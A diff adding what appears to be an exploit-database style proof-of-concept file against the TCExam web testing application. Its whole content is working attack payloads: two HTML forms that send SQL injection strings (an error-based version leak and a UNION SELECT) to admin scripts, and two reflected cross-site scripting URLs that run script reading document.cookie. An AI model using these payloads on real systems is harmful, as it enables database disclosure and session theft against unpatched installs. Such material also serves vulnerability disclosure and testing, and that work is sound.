@@ -1,0 +1,23 @@
+SQL Injection:
+
+<form action="http://tcexam/admin/code/tce_edit_test.php" method="post" name="main" id="main">
+<input type="hidden" name="test_id" value="0">
+<input type="hidden" name="test_name" value="test_name">
+<input type="hidden" name="test_description" value="test_description">
+<input type="hidden" name="user_groups[]" value="'+(select min(@a:=1)from (select 1 union select 2)k group by (select concat(@@version,0x0,@a:=(@a+1)%2)))+'">
+<input type="hidden" name="add" value="add">
+<input type="submit" name="Submit" value="Send">
+</form>
+
+<form action="http://tcexam/admin/code/tce_show_all_questions.php" method="post" name="main" id="main">
+<input type="hidden" name="subject_module_id" value="2">
+<input type="hidden" name="subject_id" value="1 UNION SELECT question_type, version() AS numquestions FROM tce_questions">
+<input type="hidden" name="update" value="update">
+<input type="submit" name="Submit" value="Send">
+</form>
+
+Cross-Site Scripting:
+
+http://www.example.com/admin/code/tce_select_users_popup.php?cid=%22%3E%3Cscript%3Ealert%28document.cookie%29 ;%3C/script%3E
+
+http://www.example.com/admin/code/tce_select_users_popup.php?uids=%22%3E%3Cscript%3Ealert%28document.cookie%2 9;%3C/script%3E
